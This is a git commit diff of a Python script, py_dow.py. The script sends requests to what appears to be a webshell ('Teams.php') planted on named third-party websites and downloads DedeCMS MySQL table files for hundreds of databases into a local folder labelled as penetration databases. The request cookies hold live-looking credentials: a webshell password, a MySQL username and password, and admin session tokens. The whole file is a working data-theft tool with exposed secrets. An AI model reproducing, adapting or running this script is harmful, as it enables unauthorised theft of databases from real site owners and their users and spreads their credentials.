8fcfda9b0271ad0bf146646ddd06b32e5591a21a
haochen <1404276788@qq.com>
2019-08-16 11:51:56 +0800

    1

--- 特殊文件/py_dow.py
+++ 特殊文件/py_dow.py
@@ -6,9 +6,11 @@ import re
 
 session = HTMLSession()
 
-dbnamelist=["a108","a109","a110","a111","a112","a113","a114","a115","a116","a117","a118","a119","a120","a121","a122","a123","a124","a125","a126","a127","a128","a129","a130","a131","a132","a133","a134","a135","a136","a137","a138","a139","a140","a141","a142","a143","a144","a145","a146","a147","a148","a149","a150","a151","a152","a153","a154","a155","a156","a157","a158","a159","a160","a161","a750","s522","s523","s524","s525","s526","s527","s528","s529","s530","s531","s532","s533","s534","s535","s536","s537","s538","s539","s540","s541","s542","s543","s544","s545","s546","s547","s548","s549","s550","s551","s552","s553","s554","s555","s556","s557","s558","s559","s560","s561","s562","s563","s564","s565","s566","s567","s568","s569","s570","s571","s572","s573","s574","s575","s576","s577","s578","s579","s580","s581","s582","s583","s584","s585","s586","s587","s588","s589","s590","s591","s592","s593","s594","s595","s596","s597","s598","s599","s600","s601","s602","s603","s604","s605","s606","s607","s608","s609","s610","s611","s612","s613","s614","s615","s616","s617","s618","s619","s620","s621","s622","s623","s624","s625","s626","s627","s628","s629","s630","s631","s632","s633","s634","s635","s636","s637","s638","s639","s640","s641","s642","s643","s644","s645","s646","s647","s648","s649","s650","s651","s652","s653","s654","s655","s656","s657","s658","s659","s660","s661","s662","s663","s664","s665","s666","s667","s668","s669","s670","s671","s672","s673","s674","s675","s676","s677","s678","s679","s680","s681","s682","s683","s684","s685","s686"]
+dbnamelist=["a1","a10","a2","a3","a4","a5","a6","a7","a8","a9","a999","k110","k111","k112","k113","k114","k115","k116","k117","k118","k119","k120","k121","k122","k123","k124","k125","k126","k127","k128","k129","k130","k131","k132","k133","k134","k135","k136","k137","k138","k139","k140","k141","k142","k143","k144","k145","k146","k147","k148","k149","k150","k151","k152","k153","k154","k155","k156","k157","k158","k159","k160","k161","k162","k163","k164","k165","k166","k167","k168","k169","k170","k171","k172","k173","k174","k175","k176","k177","k178","k179","k180","k181","k182","k183","k184","k185","k186","k187","k188","k189","k190","k191","k192","k193","k194","k195","k196","k197","k198","k199","k200","k201","k202","k203","k204","k205","k206","k207","k208","k209","k210","k211","k212","k213","k214","k215","k216","k217","k218","k219","k220","k221","k222","k223","k224","k225","k226","k227","k228","k229","k230","k231","k232","k233","k234","k235","k236","k237","k238","k239","k240","k241","k242","k243","k244","k245","k246","k247","k248","k249","k250","k251","k252","k253","k254","k255","k256","k257","k258","k259","k260","k261","k262","k263","k264","k265","k266","k267","k268","k269","k270","k271","k272","k273","k274","k275","k276","k277","k278","k279","k280","k281","k282","k283","k284","k285","k286","k287","k288","k289","k290","k291","k292","k293","k294","k295","k296","k297","k298","k299","k300","k301","k302","k303","k304","k305","k306","k307","k308","k309","k310","k311","k312","k313","k314","k315","k316","k317","k318","k319","k320","k321","k322","k323","k324","k325","k326","k327","k328","k329","k330","k331","k332","k333","k334","k335","k336"]
 
-url_h="http://www.durerchina.com/uploads/170622/Teams.php?down=D%3A%2Fbeifen%2Fmysql%2F"
+# http://wanhaika.net/plus/Teams.php?eanver=main&path=D%3A%2FBaiduNetdiskDownload%2F92.22%2Fmysql%2Fmysql%2Fa1
+
+url_h="http://wanhaika.net/plus/Teams.php?down=D%3A%2FBaiduNetdiskDownload%2F92.22%2Fmysql%2Fmysql%2F"
 dede_flink_frm = "dede_flink.frm"
 dede_flink_MYD = "dede_flink.MYD"
 dede_flink_MYI = "dede_flink.MYI"
@@ -29,10 +31,10 @@ for dbname in dbnamelist:
         "{}%2F{}".format(dbname,dede_sysconfig_frm),"{}%2F{}".format(dbname,dede_sysconfig_MYD),"{}%2F{}".format(dbname,dede_sysconfig_MYI)]
     ]
     headers={
-        "cookie":"envlpass=aafe421b8ad20fe391be17a529c844c2; serveru=www.nsxfgls.com%2Fa%2Fyule%2FTeams.php; serverp=cc11; m_eanverhost=localhost; m_eanverport=3306; m_eanverpass=wanli361361A; m_eanveruser=admin0101; PHPSESSID=atb5vu2eu0msl1pdokqlehjvs2; DedeUserID=1; DedeUserID__ckMd5=4d1f262aec2d6e6b; DedeLoginTime=1560742866; DedeLoginTime__ckMd5=69e3e4dd301d5272"
+        "cookie":"envlpass=aafe421b8ad20fe391be17a529c844c2; serveru=wanhaika.net%2Fplus%2FTeams.php; serverp=cc11; m_eanverhost=localhost; m_eanverport=3306; m_eanveruser=admin01; m_eanverpass=wanli361361A; UM_distinctid=16c933776c533e-00feeb5c705c04-39395704-1fa400-16c933776c61f6; CNZZDATA1275182123=338178046-1565837981-%7C1565837981; CNZZDATA1277906134=571541134-1565837986-%7C1565837986; PHPSESSID=qmhr21mkvel0ldsebt9uu9arh2; DedeUserID=1; DedeUserID__ckMd5=75678db749c8a6af; DedeLoginTime=1565838662; DedeLoginTime__ckMd5=be09b5d7365e86db"
     }
     # D:\www\备份文件\渗透数据库
-    my_file="D:/www/备份文件/渗透数据库/2/{}".format(dbname)
+    my_file="D:/www/备份文件/渗透数据库/1/{}".format(dbname)
     my_file_name1=my_file+ "/" +dede_flink_frm
     my_file_name2=my_file+ "/" +dede_flink_MYD
     my_file_name3=my_file+ "/" +dede_flink_MYI
